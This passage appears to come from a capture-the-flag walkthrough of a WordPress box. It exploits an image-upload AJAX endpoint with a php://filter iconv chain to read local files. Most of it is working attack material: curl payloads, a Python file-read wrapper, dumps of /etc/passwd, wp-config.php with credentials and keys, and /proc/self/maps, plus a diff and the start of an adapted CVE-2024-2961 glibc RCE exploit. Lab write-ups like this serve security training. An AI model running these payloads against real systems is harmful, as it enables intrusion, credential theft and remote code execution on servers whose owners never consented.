└─$ curl 'http://blog.bigbang.htb/wp-admin/admin-ajax.php' -H "Content-Type: application/x-www-form-urlencoded" -d 'action=upload_image_from_url&id=1&url=php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource=file:///etc/passwd&accepted_files=image/gif'
{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/01\/1-7.png","attachment_id":169}
```

We received the response with the full `URL` to the `uploaded file` which we downloaded using `wget` to inspect it.

```c
┌──(venv)─(kali㉿kali)-[~/opt/payloads/wrapwrap]
└─$ wget http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/01\/1-7.png
--2025-01-26 09:47:47--  http://blog.bigbang.htb/wp-content/uploads/2025/01/1-7.png
Resolving blog.bigbang.htb (blog.bigbang.htb)... 10.129.79.234
Connecting to blog.bigbang.htb (blog.bigbang.htb)|10.129.79.234|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 843 [image/png]
Saving to: ‘1-7.png’

1-7.png                                                    100%[========================================================================================================================================>]     843  --.-KB/s    in 0s      

2025-01-26 09:47:47 (137 MB/s) - ‘1-7.png’ saved [843/843]
```

And the file contained the output of `/etc/passwd` which was allowed by the buffer to exfiltrate.

```c
┌──(venv)─(kali㉿kali)-[~/opt/payloads/wrapwrap]
└─$ cat 1-7.png 
GIF89aroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologi
```

##### Wrapper

Now `mk0` came into play and provided us a `wrapper` to read files more easily!

```python
import requests
import os

def upload_file_read(file_path):
    url = "http://blog.bigbang.htb/wp-admin/admin-ajax.php"

    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    payload = (
        "action=upload_image_from_url&id=1&url="
        "php://filter/convert.base64-encode|convert.iconv.855.UTF7|"
        "convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|"
        "convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|"
        "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|"
        "convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|"
        "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|"
        "convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|"
        "convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|"
        "convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|"
        "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|"
        "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|"
        "convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|"
        "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|"
        "convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|"
        "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|"
        "convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|"
        f"convert.base64-decode/resource=file://{file_path}&accepted_files=image/gif"
    )

    print(f"[*] Target URL: {url}")
    print(f"[*] Trying to read file: {file_path}")

    response = requests.post(url, headers=headers, data=payload)

    if response.status_code == 200:
        print("[+] Request successful!")
        print("[*] Response:")
        print(response.text)

        try:
            response_data = response.json()
            image_url = response_data.get("response")
            if image_url:
                print(f"[*] Downloading image from: {image_url}")
                image_response = requests.get(image_url)
                if image_response.status_code == 200:
                    image_filename = image_url.split("/")[-1]
                    with open(image_filename, "wb") as img_file:
                        img_file.write(image_response.content)
                    print(f"[+] Image downloaded: {image_filename}")

                    print("[*] Displaying image content:")
                    with open(image_filename, "rb") as img_file:
                        content = img_file.read()
                        if content.startswith(b"GIF89a"):
                            decoded_content = content.decode("utf-8", errors="ignore")
                            print("\n--- BEGIN FILE CONTENT ---")
                            print("\n".join(line for line in decoded_content.splitlines()))
                            print("--- END FILE CONTENT ---\n")
                        else:
                            print("[-] The file is not a valid image or does not contain readable content.")
                else:
                    print("[-] Failed to download the image.")
            else:
                print("[-] No image URL found in the response.")
        except ValueError:
            print("[-] Failed to parse the JSON response.")
    else:
        print(f"[-] Error: {response.status_code}")
        print(response.text)

if __name__ == "__main__":
    file_to_read = input("Enter the file path to read (e.g., /etc/passwd): ")
    upload_file_read(file_to_read)
```

His amazing work helped us making progress much faster than performing each step manually every time we wanted to read a file.

```c
┌──(venv)─(kali㉿kali)-[~/opt/payloads/wrapwrap]
└─$ python3 wrapper.py
Enter the file path to read (e.g., /etc/passwd): /etc/passwd
[*] Target URL: http://blog.bigbang.htb/wp-admin/admin-ajax.php
[*] Trying to read file: /etc/passwd
[+] Request successful!
[*] Response:
{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/01\/1-12.png","attachment_id":174}
[*] Downloading image from: http://blog.bigbang.htb/wp-content/uploads/2025/01/1-12.png
[+] Image downloaded: 1-12.png
[*] Displaying image content:

--- BEGIN FILE CONTENT ---
GIF89aroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologi
--- END FILE CONTENT ---
```

As next step we checked the `/etc/hosts` file to see if the application was actually running inside a `container`. And indeed it was.

```c
┌──(venv)─(kali㉿kali)-[~/opt/payloads/wrapwrap]
└─$ python3 wrapper.py
Enter the file path to read (e.g., /etc/passwd): /etc/hosts
[*] Target URL: http://blog.bigbang.htb/wp-admin/admin-ajax.php
[*] Trying to read file: /etc/hosts
[+] Request successful!
[*] Response:
{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/01\/1-13.png","attachment_id":175}
[*] Downloading image from: http://blog.bigbang.htb/wp-content/uploads/2025/01/1-13.png
[+] Image downloaded: 1-13.png
[*] Displaying image content:

--- BEGIN FILE CONTENT ---
GIF89a127.0.0.1 localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.3      bf9a078
--- END FILE CONTENT ---
```

To read even `.php` files and not get them rendered by the `web server`, `mk0` updated the wrapper.

```python
import requests
import os

def upload_file_read(file_path):
    url = "http://blog.bigbang.htb/wp-admin/admin-ajax.php"

    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    payload = (
        "action=upload_image_from_url&id=1&url="
        "php://filter/convert.base64-encode|convert.iconv.855.UTF7|"
        "convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|"
        "convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|"
        "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|"
        "convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|"
        "convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|"
        "convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|"
        "convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|"
        "convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|"
        "convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|"
        "convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|"
        "convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|"
        "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|"
        "convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|"
        "convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|"
        "convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|"
        "convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|"
        f"convert.base64-decode/resource={file_path}&accepted_files=image/gif"
    )

    print(f"[*] Target URL: {url}")
    print(f"[*] Trying to read file: {file_path}")

    response = requests.post(url, headers=headers, data=payload)

    if response.status_code == 200:
        print("[+] Request successful!")
        print("[*] Response:")
        print(response.text)

        try:
            response_data = response.json()
            image_url = response_data.get("response")
            if image_url:
                print(f"[*] Downloading image from: {image_url}")
                image_response = requests.get(image_url)
                if image_response.status_code == 200:
                    image_filename = image_url.split("/")[-1]
                    with open(image_filename, "wb") as img_file:
                        img_file.write(image_response.content)
                    print(f"[+] Image downloaded: {image_filename}")

                    print("[*] Displaying image content:")
                    with open(image_filename, "rb") as img_file:
                        content = img_file.read()
                        if content.startswith(b"GIF89a"):
                            decoded_content = content.decode("utf-8", errors="ignore")
                            print("\n--- BEGIN FILE CONTENT ---")
                            print("\n".join(line for line in decoded_content.splitlines()))
                            print("--- END FILE CONTENT ---\n")
                        else:
                            print("[-] The file is not a valid image or does not contain readable content.")
                else:
                    print("[-] Failed to download the image.")
            else:
                print("[-] No image URL found in the response.")
        except ValueError:
            print("[-] Failed to parse the JSON response.")
    else:
        print(f"[-] Error: {response.status_code}")
        print(response.text)

if __name__ == "__main__":
    file_to_read = input("Enter the file path to read (e.g., /etc/passwd): ")
    upload_file_read(file_to_read)
```

According to his changes we were able to read `wp-config.php` and found some `credentials` for the `MySQL` database.

```c
┌──(venv)─(kali㉿kali)-[~/opt/payloads/wrapwrap]
└─$ python3 wrapper.py
Enter the file path to read (e.g., /etc/passwd): ../wp-config.php
[*] Target URL: http://blog.bigbang.htb/wp-admin/admin-ajax.php
[*] Trying to read file: ../wp-config.php
7[+] Request successful!
[*] Response:
{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/01\/1-15.png","attachment_id":177}
[*] Downloading image from: http://blog.bigbang.htb/wp-content/uploads/2025/01/1-15.png
[+] Image downloaded: 1-15.png
[*] Displaying image content:

--- BEGIN FILE CONTENT ---
GIF89a<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wp_user' );

/** Database password */
define( 'DB_PASSWORD', 'wp_password' );

/** Database hostname */
define( 'DB_HOST', '172.17.0.1' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '(6xl?]9=.f9(<(yxpm9]5<wKsyEc+y&MV6CjjI(0lR2)_6SWDnzO:[g98nOOPaeK' );
define( 'SECURE_AUTH_KEY',  'F<3>KtCm^zs]Mxm Rr*N:&{SWQexFn@ wnQ+bTN5UCF-<gMsT[mH$m))T>BqL}%8' );
define( 'LOGGED_IN_KEY',    ':{yhPsf}tZRfMAut2$Fcne/.@Vs>uukS&JB04 Yy3{`$`6p/Q=d^9=ZpkfP,o%l]' );
define( 'NONCE_KEY',        'sC(jyKu>gY(,&: KS#Jh7x?/CB.hy8!_QcJhPGf@3q<-a,D#?!b}h8 ao;g[<OW;' );
define( 'AUTH_SALT',        '_B& tL]9I?ddS! 0^_,4M)B>aHOl{}e2P(l3=!./]~v#U>dtF7zR=~LnJtLgh&KK' );
define( 'SECURE_AUTH_SALT', '<Cqw6ztRM/y?eGvMzY(~d?:#]v)em`.H!SWbk.7Fj%b@Te<r^^Vh3KQ~B2c|~VvZ' );
define( 'LOGGED_IN_SALT',   '_zl+LT[GqIV{*Hpv>]H:<U5oO[w:]?%Dh(s&Tb-2k`1!WFqKu;elq7t^~v7zS{n[' );
define( 'NONCE_SALT',       't2~PvIO1qeCEa^+J}@h&x<%u~Ml{=0Orqe]l+DD7S}%KP}yi(6v$mHm4cjsK,vCZ' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
@C>==@C>==@
--- END FILE CONTENT ---
```

| Username | Password    |
| -------- | ----------- |
| wp_user  | wp_password |

We tried to enumerate as much of `/proc/` as we could and ended up getting the output of `/prof/self/maps` which would come in handy at the next step.

```c
┌──(venv)─(kali㉿kali)-[~/opt/payloads/wrapwrap]
└─$ python3 wrapper.py
Enter the file path to read (e.g., /etc/passwd): ../../../../../proc/self/maps
[*] Target URL: http://blog.bigbang.htb/wp-admin/admin-ajax.php
[*] Trying to read file: ../../../../../proc/self/maps
[+] Request successful!
[*] Response:
{"status":"OK","response":"http:\/\/blog.bigbang.htb\/wp-content\/uploads\/2025\/01\/1-4.png","attachment_id":159}
[*] Downloading image from: http://blog.bigbang.htb/wp-content/uploads/2025/01/1-4.png
[+] Image downloaded: 1-4.png
[*] Displaying image content:

--- BEGIN FILE CONTENT ---
GIF89a561bdff68000-561bdffa0000 r--p 00000000 00:3b 263431                     /usr/sbin/apache2
561bdffa0000-561bdffef000 r-xp 00038000 00:3b 263431                     /usr/sbin/apache2
561bdffef000-561be0013000 r--p 00087000 00:3b 263431                     /usr/sbin/apache2
561be0013000-561be0017000 r--p 000aa000 00:3b 263431                     /usr/sbin/apache2
561be0017000-561be001b000 rw-p 000ae000 00:3b 263431                     /usr/sbin/apache2
561be001b000-561be001f000 rw-p 00000000 00:00 0 
561c17e92000-561c1811c000 rw-p 00000000 00:00 0                          [heap]
561c1811c000-561c18291000 rw-p 00000000 00:00 0                          [heap]
7fb4f8000000-7fb4f8021000 rw-p 00000000 00:00 0 
7fb4f8021000-7fb4fc000000 ---p 00000000 00:00 0 
<--- CUT FOR BREVITY --->
7fb50709e000-7fb5070c4000 r--p 00000000 00:3b 292782                     /usr/lib/x86_64-linux-gnu/libc.so.6
7fb5070c4000-7fb507219000 r-xp 00026000 00:3b 292782                     /usr/lib/x86_64-linux-gnu/libc.so.6
7fb507219000-7fb50726c000 r--p 0017b000 00:3b 292782                     /usr/lib/x86_64-linux-gnu/libc.so.6
7fb50726c000-7fb507270000 r--p 001ce000 00:3b 292782                     /usr/lib/x86_64-linux-gnu/libc.so.6
7fb507270000-7fb507272000 rw-p 001d2000 00:3b 292782                     /usr/lib/x86_64-linux-gnu/libc.so.6
<--- CUT FOR BREVITY --->
7fffa3574000-7fffa3595000 rw-p 00000000 00:00 0                          [stack]
7fffa35d6000-7fffa35da000 r--p 00000000 00:00 0                          [vvar]
7fffa35da000-7fffa35dc000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsys
--- END FILE CONTENT ---
```

### Custom Exploit Development

#### Iconv, set the charset to RCE: Exploiting the glibc to hack the PHP engine (part 3)

To achieve actual `Remote Code Execution RCE` on the box we followed `part 3` of the series. This post explained how we could perform `Binary Exploitation`, `remotely` through `PHP` and `iconv`.

- [https://www.ambionics.io/blog/iconv-cve-2024-2961-p3](https://www.ambionics.io/blog/iconv-cve-2024-2961-p3)
- [https://github.com/ambionics/cnext-exploits](https://github.com/ambionics/cnext-exploits)
- [https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py](https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py)

Luckily for us the amazing team at `Ambionics Security` provided a `Proof of Concept (PoC)` exploit, which needed some modification to fit our needs.

##### Proof of Concept (POC) Modifications

We documented the modification which `mk0` made in order to perform the exploitation.

```python
--- /home/kali/Downloads/temp/cnext-exploit.py
+++ /home/kali/Downloads/temp/exploit.py
@@ -14,7 +14,9 @@
 from __future__ import annotations
 
 import base64
+import urllib.parse
 import zlib
+import urllib
 
 from dataclasses import dataclass
 from requests.exceptions import ConnectionError, ChunkedEncodingError
@@ -52,15 +54,40 @@
     def send(self, path: str) -> Response:
         """Sends given `path` to the HTTP server. Returns the response.
         """
-        return self.session.post(self.url, data={"file": path})
+
+        data = {'action' : 'upload_image_from_url',
+                'url' : urllib.parse.quote_plus('php://filter/convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.855.UTF7|convert.base64-decode/resource='+path),
+                'id' : '1',
+                'accepted_files' : 'image/gif'}
+        return self.session.post(self.url, data=data)
+
+
+    def send_exploit(self, payload: bytes) -> Response:
+        """Sends the payload to the server.
+        """
+        data = {'action' : 'upload_image_from_url',
+                'url' : urllib.parse.quote_plus(payload),
+                'id' : '1',
+                'accepted_files' : 'image/gif'}
+        return self.session.post(self.url, data=data)
         
     def download(self, path: str) -> bytes:
         """Returns the contents of a remote file.
         """
         path = f"php://filter/convert.base64-encode/resource={path}"
-        response = self.send(path)
-        data = response.re.search(b"File contents: (.*)", flags=re.S).group(1)
-        return base64.decode(data)
+        file_path = self.send(path).json()['response']
+        
+        if 'File type' in file_path:
+            print(file_path)
+            return b''
+        
+        response = self.session.get(file_path)
+        data = response.content[6:]
+        return data
+
+    def data_decode(self, data:bytes)->bytes:
+        data = data.decode('latin-1')
+        return base64.decode(data + (4 - len(data) % 4) * '=')
 
 @entry
 @arg("url", "Target URL")
@@ -102,15 +129,16 @@
 
         def check_token(text: str, path: str) -> bool:
             result = safe_download(path)
-            return text.encode() == result
+
+            return len(set(result).intersection(set(text.encode()))) > 0
 
         text = tf.random.string(50).encode()
-        base64 = b64(text, misalign=True).decode()
+        base64 = b64(b'GIF89a' + text, misalign=True).decode()
         path = f"data:text/plain;base64,{base64}"
         
         result = safe_download(path)
         
-        if text not in result:
+        if len(set(result).intersection(set(text))) == 0:
             msg_failure("Remote.download did not return the test string")
             print("--------------------")
             print(f"Expected test string: {text}")
@@ -120,7 +148,7 @@
 
         msg_info("The [i]data://[/] wrapper works")
 
-        text = tf.random.string(50)
+        text = 'GIF89a' + tf.random.string(50)
         base64 = b64(text.encode(), misalign=True).decode()
         path = f"php://filter//resource=data:text/plain;base64,{base64}"
         if not check_token(text, path):
@@ -128,7 +156,7 @@
 
         msg_info("The [i]php://filter/[/] wrapper works")
 
-        text = tf.random.string(50)
+        text = 'GIF89a' + tf.random.string(50)
         base64 = b64(compress(text.encode()), misalign=True).decode()
         path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"
 
@@ -145,8 +173,8 @@
 
     def get_regions(self) -> list[Region]:
         """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
-        maps = self.get_file("/proc/self/maps")
-        maps = maps.decode()
+        maps = self.remote.data_decode(self.get_file("/proc/self/maps"))
+        
         PATTERN = re.compile(
             r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
         )
@@ -164,7 +192,6 @@
                 current = Region(start, stop, permissions, path)
                 regions.append(current)
             else:
-                print(maps)
                 failure("Unable to parse memory mappings")
 
         self.log.info(f"Got {len(regions)} memory regions")
@@ -175,19 +202,21 @@
         """Obtains useful symbols and addresses from the file read primitive."""
         regions = self.get_regions()
 
-        LIBC_FILE = "/dev/shm/cnext-libc"
+        LIBC_FILE = "./libc.so.6"
 
         # PHP's heap
 
         self.info["heap"] = self.heap or self.find_main_heap(regions)
+        print(f'HEAP address: {hex(self.info["heap"])}')
 
         # Libc
 
         libc = self._get_region(regions, "libc-", "libc.so")
 
-        self.download_file(libc.path, LIBC_FILE)
+        #self.download_file(libc.path, LIBC_FILE)
 
         self.info["libc"] = ELF(LIBC_FILE, checksec=False)
+        print(f'LIBC address: {hex(libc.start)}')
         self.info["libc"].address = libc.start
 
     def _get_region(self, regions: list[Region], *names: str) -> Region:
@@ -202,7 +231,7 @@
 
     def download_file(self, remote_path: str, local_path: str) -> None:
         """Downloads `remote_path` to `local_path`"""
-        data = self.get_file(remote_path)
+        data = self.remote.data_decode(self.get_file(remote_path))
         Path(local_path).write(data)
 
     def find_main_heap(self, regions: list[Region]) -> Region:
@@ -224,14 +253,14 @@
 
         if len(heaps) > 1:
             heaps = ", ".join(map(hex, heaps))
-            msg_info(f"Potential heaps: [i]{heaps}[/] (using first)")
+            msg_info(f"Potential heaps: [i]{heaps}[/] (using last one)")
         else:
             msg_info(f"Using [i]{hex(first)}[/] as heap")
 
         return first
 
     def run(self) -> None:
-        self.check_vulnerable()
+        #self.check_vulnerable()
         self.get_symbols_and_addresses()
         self.exploit()
 
@@ -443,7 +472,7 @@
         )
 
         resource = compress(compress(pages))
-        resource = b64(resource)
+        resource = b64(resource) #b64(pages) 
         resource = f"data:text/plain;base64,{resource.decode()}"
 
         filters = [
@@ -482,7 +511,10 @@
         start = time.time()
 
         try:
-            self.remote.send(path)
+            msg_print("Sending exploit...")
+            print(f'PATH: {path}')
+
+            self.remote.send_exploit(path)
         except (ConnectionError, ChunkedEncodingError):
             pass
         

```

##### Final Exploit

The final exploit required the correct version of `glibc` in order to work. We received the information already my dumping `/proc/self/maps`. We also checked `/etc/os-release` and got the information that the box was running `Debian 12` aka `Bookworm`.

```python
#!/usr/bin/env python3
#
# CNEXT: PHP file-read to RCE (CVE-2024-2961)
# Date: 2024-05-27
# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
#
# TODO Parse LIBC to know if patched
#
# INFORMATIONS
#
# To use, implement the Remote class, which tells the exploit how to send the payload.
#

from __future__ import annotations

import base64
import urllib.parse
import zlib
import urllib

from dataclasses import dataclass
from requests.exceptions import ConnectionError, ChunkedEncodingError

from pwn import *
from ten import *


HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")


class Remote:
    """A helper class to send the payload and download files.
    
    The logic of the exploit is always the same, but the exploit needs to know how to
    download files (/proc/self/maps and libc) and how to send the payload.
    
    The code here serves as an example that attacks a page that looks like:
    
    ```php
    <?php
    
    $data = file_get_contents($_POST['file']);
    echo "File contents: $data";
    ```
    
    Tweak it to fit your target, and start the exploit.
    """

    def __init__(self, url: str) -> None:
        self.url = url
        self.session = Session()

    def send(self, path: str) -> Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """

        data = {'action' : 'upload_image_from_url',
